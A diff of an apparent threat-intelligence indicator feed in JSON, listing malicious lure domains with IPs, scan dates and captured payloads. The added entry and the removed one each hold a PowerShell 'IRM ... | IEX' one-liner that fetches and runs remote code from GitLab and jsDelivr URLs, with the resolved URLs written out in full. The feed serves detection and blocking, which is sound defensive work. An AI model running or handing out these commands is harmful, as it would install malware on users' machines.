@@ -1,5 +1,25 @@
 [
   {
+    "UrlDomain": "thelilypadlearningcenter.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "72.167.68.110"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwobzc2a1yzx0oml26ze35ud",
+    "ScannedAt": "2026-11-20T01:59:17.278000+00:00"
+  },
+  {
     "UrlDomain": "canconnectmedia.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -901,27 +921,5 @@
     ],
     "ReportId": "cmwn2vd8k1uub0oml0r8kfv2r",
     "ScannedAt": "2026-11-19T04:56:29.394000+00:00"
-  },
-  {
-    "UrlDomain": "bastion-kansk.ru",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "185.9.147.250"
-    ],
-    "Related": [
-      {
-        "Value": "https://urshort.com/nsehzscux0r9",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmwmw4g2q1ulx0omljr4g3cvy",
-    "ScannedAt": "2026-11-19T01:47:35.719000+00:00"
   }
 ]
